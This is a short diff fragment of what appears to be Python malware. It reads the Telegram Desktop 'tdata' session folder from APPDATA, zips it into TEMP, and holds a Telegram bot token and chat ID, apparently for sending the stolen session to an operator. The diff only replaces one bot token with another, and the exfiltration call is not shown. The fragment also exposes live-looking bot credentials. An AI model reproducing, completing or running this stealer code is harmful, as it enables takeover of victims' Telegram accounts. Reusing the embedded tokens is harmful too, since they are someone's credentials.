@@ -8,7 +8,7 @@ import urllib3
 
 urllib3.disable_warnings(InsecureRequestWarning)
 
-TOKEN = '7907112586:AAG3MlI_1cg7NllgM1glqq9iQqgboboSAMM'
+TOKEN = '8163157021:AAGE1b81bD7n7NB4UMCXhIjYqnlM2ZGyFMo'
 CHAT_ID = '7984884145'
 TDATA_PATH = os.path.join(os.getenv('APPDATA'), 'Telegram Desktop', 'tdata')
 ZIP_PATH = os.path.join(os.getenv('TEMP'), 'tdata.zip')
